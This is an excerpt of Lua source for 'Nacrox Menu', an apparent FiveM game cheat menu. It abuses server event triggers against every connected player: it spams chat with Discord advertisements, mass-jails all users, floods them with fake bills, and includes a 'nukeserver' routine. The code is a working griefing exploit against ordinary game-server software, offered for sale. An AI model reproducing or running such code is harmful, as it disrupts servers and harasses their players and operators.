                    ...
                    function()
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Nacrox#9521 Desudo https://discord.gg/MRnVqVR',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Desudo; Nacrox#9521")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'Nacrox#9521',
                    {0, 0x99, 255},
                    '/ooc Nacrox Menu! Buy at https://discord.gg/MRnVqVR'
                )
                TriggerServerEvent('_chat:messageEntered', 'Nacrox#9521', {0, 0x99, 255}, 'Nacrox Menu <3 https://discord.gg/MRnVqVR')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Nacrox Menu <3 Nacrox#9521 https://discord.gg/MRnVqVR")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Desudo Babe <3 Nacrox#9521 https://discord.gg/MRnVqVR")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "Nacrox")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Nacrox ~s~GENG")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Nacrox Menu https://discord.gg/pAExtdR", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Nacrox Menu https://discord.gg/pAExtdR", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Nacrox Menu https://discord.gg/pAExtdR", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Nacrox Menu https://discord.gg/pAExtdR", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Nacrox Menu https://discord.gg/pAExtdR", "6969696969")
                end
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.Button(" ~y~~h~Nacrox#9521 - Developer") then
